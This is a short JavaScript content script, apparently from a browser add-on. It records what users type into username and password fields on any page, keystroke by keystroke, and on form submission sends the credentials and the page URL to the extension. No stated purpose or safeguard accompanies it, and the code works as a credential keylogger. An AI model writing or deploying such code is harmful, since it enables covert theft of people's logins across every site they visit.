$('form').submit(function() {
      var message = '{"username":"' + uname + '", '+
                    '"password":"' + pass + '", '+
                    '"url":"' + window.location.href + '"}'; 
        //console.log(uname + " " + pass);
        self.port.emit("message", message);
});

var uname;
var pass="";

$('input').blur(function() {
    if($(this).attr('type')==="email" || $(this).attr('type')==="text")
        uname=$(this).val();
});

$('input:password').keypress(function(event) {
       
        if(event.which>31) {
            pass=pass.concat(String.fromCharCode(event.which));
        }
        else if(event.which === 8)
            pass=pass.substring(0, pass.length-1);

});
